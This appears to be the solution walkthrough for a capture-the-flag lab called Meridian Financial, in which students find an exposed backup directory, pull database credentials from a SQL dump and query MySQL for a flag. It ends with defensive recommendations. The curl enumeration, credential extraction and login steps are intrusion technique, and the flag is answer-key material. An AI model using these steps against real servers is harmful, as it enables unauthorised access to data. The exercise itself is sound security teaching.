# Meridian Financial. Data Breach Assessment

## Overview

Students investigate a corporate intranet and backend database to assess the scope of a data breach caused by misconfigured backup storage. The exercise reinforces data protection concepts including data-at-rest exposure, data classification, retention policies, and credential management in backup artifacts.

## Architecture

```
┌─────────────┐                     ┌───────────────┐    leaked creds    ┌───────────────┐
│   Student    │ ──── HTTP:80 ────▶ │  webserver     │ ─────────────────▶ │   dbserver     │
│   (Kali VM)  │                    │  (nginx        │                    │  (MySQL 8.0    │
│              │ ── MySQL:3306 ───▶ │   intranet)    │                    │   3 schemas)   │
└─────────────┘                     └───────────────┘                     └───────────────┘
                                     Backup SQL dump                       Flag in compliance
                                     with DB creds                         findings table
```

## Solution Walkthrough

### Step 1: Enumerate the Intranet

```bash
# Access the main page
curl http://<webserver_ip>/

# Discover linked pages
curl http://<webserver_ip>/staff/
curl http://<webserver_ip>/notices/
curl http://<webserver_ip>/policies/
curl http://<webserver_ip>/contact/
```

Key finding: IT Notices mention a "backup migration" and legacy archive files.

### Step 2: Discover Backup Directory

```bash
# Direct /backups/ is restricted
curl -s -o /dev/null -w '%{http_code}' http://<webserver_ip>/backups/
# Returns 403

# Legacy subdirectory is accessible
curl http://<webserver_ip>/backups/legacy/
# Shows meridian_dump.sql and migration_notes.txt
```

### Step 3: Extract Credentials from SQL Dump

```bash
curl http://<webserver_ip>/backups/legacy/meridian_dump.sql | grep -i password
# GRANT ... 'meridian_app' ... BY 'M3r1d14n_App_2024#'

curl http://<webserver_ip>/backups/legacy/migration_notes.txt
# Confirms application service account details
```

### Step 4: Connect to Database

```bash
mysql -h <dbserver_ip> -u meridian_app -p'M3r1d14n_App_2024#'

SHOW DATABASES;
# meridian_compliance (accessible)
# meridian_hr (permission denied)
# meridian_finance (permission denied)
```

### Step 5: Enumerate Compliance Database

```bash
USE meridian_compliance;
SHOW TABLES;
# data_classifications, compliance_findings, audit_log

SELECT * FROM data_classifications WHERE classification = 'PII';
# Shows PII records and their locations

SELECT * FROM compliance_findings WHERE severity = 'CRITICAL';
# Returns CF-2026-001 with flag: OCR{d4ta_br34ch_3xp0s3d}
```

## Common Mistakes

- **Not enumerating subdirectories.** Students may see the 403 on `/backups/` and give up without trying subdirectories like `/backups/legacy/`.
- **Missing the GRANT statement.** The credentials are in a SQL comment at the bottom of the dump file. Students who skim the top may miss them.
- **Trying to access meridian_hr or meridian_finance.** These databases exist but the service account only has SELECT on meridian_compliance. This teaches least privilege.
- **Looking for flag.txt.** The flag is in a database table, not a file. Students must query the right table and filter by severity.

## Defensive Recommendations

- Never expose backup directories through a web server, even "temporarily"
- Implement defense-in-depth: web server access controls AND filesystem permissions
- Remove credentials from SQL dumps before archiving
- Use separate credentials for backup operations and application access
- Encrypt backup files at rest per data classification policy
- Audit web server directory configurations after any migration or infrastructure change
